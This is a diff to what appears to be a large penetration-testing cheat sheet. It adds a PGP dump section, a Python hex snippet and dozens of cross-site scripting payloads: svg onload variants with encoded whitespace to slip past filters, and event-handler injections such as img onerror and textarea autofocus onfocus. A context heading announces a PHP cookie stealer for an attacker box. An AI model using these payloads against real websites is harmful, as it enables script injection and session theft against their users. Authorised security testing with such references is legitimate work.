@@ -4007,6 +4007,15 @@ cat strings_here.txt |perl -MDigest::MD5=md5_hex -nlE'say"".md5_hex($_)' > out
 ```
 
 
+## PGP
+```bash
+# dump PGP info
+pgpdump private_key_here
+pgpdump signed_message_here
+sq packet dump -x --mpis signed_message_here
+```
+
+
 
 ## PHP
 ```php
@@ -4621,7 +4630,7 @@ log.info('some string here:{}'.format(hex(hex_adress)))
 ```
 
 
-## PYTHON & PYTHON3
+## PYTHON2 & PYTHON3
 ```python
 # user python path from env
 #!/usr/bin/env python
@@ -4750,6 +4759,9 @@ stripped = "".join(s.split())
 # execute os commands
 import os
 os.system("command_here")
+
+# PY3 work with hex bytes
+bytes = b'\xca\xfe\xca\xfe'.hex() # prints 'cafecafe'
 ```
 
 
@@ -6218,6 +6230,17 @@ xprobe2 -v -p tcp:port_here:open IP_here
 >alert(1);</script> # new line
 <scr<script>ipt>alert(1);</scr</script>ipt># nested
 <scr\x00ipt>alert(1);</scr\x00ipt>  # null byte (IE)
+<svg/onload=alert(1)>
+<svg///////onload=alert(1)>
+<svg id=x;onload=alert(1)>
+<svg id=`x` onload=alert(1)>
+<svg onload%09=alert(1)>
+<svg %09onload=alert(1)>
+<svg %09onload%20=alert(1)>
+<svg onload%0B=alert(1)>
+<svg onload%09%20%28%2C%3B=alert(1)>
+<img onload=prompt(1)>
+<script>confirm(1)</script>
 
 # href
 <a href="javascript:alert(1)">boomXSS</a>
@@ -6235,6 +6258,18 @@ xprobe2 -v -p tcp:port_here:open IP_here
 <object data="javascript:alert(1)">
 <object data="data:text/html,<script>alert(1)</script>">
 <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+
+# on...
+<img src=x onerror=alert(1)>
+<body onload=alert(1)>
+<input type=image src=x:x onerror=alert(1)>
+<isindex onmouseover="alert(1)">
+<form oninput=alert(1)><input></form>
+<textarea autofocus onfocus=alert(1)>
+<input oncut=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<video><source onerror="alert(1)">
+<marquee onstart=alert(1)>
 
 # cookie stealer (PHP)
 ## setup cookie stealer on attacker box
